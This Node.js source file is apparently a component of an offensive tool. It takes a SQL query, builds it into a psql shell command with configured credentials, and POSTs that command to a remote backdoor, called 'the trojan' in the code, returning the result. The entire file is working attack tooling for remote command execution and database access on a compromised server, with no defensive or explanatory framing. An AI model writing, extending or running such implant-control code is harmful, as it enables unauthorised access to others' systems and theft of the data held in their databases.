const errors = require('./util-http-error');
const shelly = require('shelly');

module.exports = function(config, req, cmd, callback) {

  // assert that psql credentials have been set
  if (! config.target.psql.username) {
    return callback(new Error('config: psql username unspecified.'));
  }

  // save the SQL query
  const query = cmd;

  // edge case: \connect command
  if (/^\\connect /.test(query)) {
    const database = query.split(' ')[1].replace(';', '');
    config.target.psql.database = database;
  }

  // embed the psql query in a shell command as a batch
  cmd = shelly(
    'psql -U ? ? -c ?',
    config.target.psql.username,
    config.target.psql.database || '',
    query
  );

  // initialize the POST body
  const body = {
    cmd : cmd,
  };

  // POST to the trojan
  req.post({ body : body }, function(err, obj, response) {

    if (obj.statusCode !== 200) {
      return callback(errors(config, obj.statusCode));
    }

    callback(err, response);
  });
};
